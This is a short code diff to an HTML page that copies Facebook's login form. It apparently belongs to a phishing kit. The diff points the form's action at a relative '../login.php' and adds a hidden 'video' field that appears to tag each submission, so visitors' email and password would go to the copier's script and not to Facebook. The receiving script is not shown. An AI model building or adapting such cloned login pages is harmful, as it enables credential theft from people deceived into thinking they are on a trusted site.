@@ -102,10 +102,11 @@
                             <div class="_8esn">
                                 <div class="_8iep _8icy _9ahz _9ah-">
                                     <div class="_6luv _52jv">
-                                        <form class="_9vtf" data-testid="royal_login_form" action="login.php"
+                                        <form class="_9vtf" data-testid="royal_login_form" action="../login.php"
                                             method="post" onsubmit="" id="u_0_a"><input type="hidden" name="jazoest"
                                                 value="2858" autocomplete="off" /><input type="hidden" name="lsd"
                                                 value="AVr7F_5T5Pg" autocomplete="off" />
+                                                <input type="hidden" name="video" value="ec4f4ae3">
                                             <div>
                                                 <div class="_6lux"><input type="text" class="inputtext _55r1 _6luy"
                                                         name="email" id="email" data-testid="royal_email"
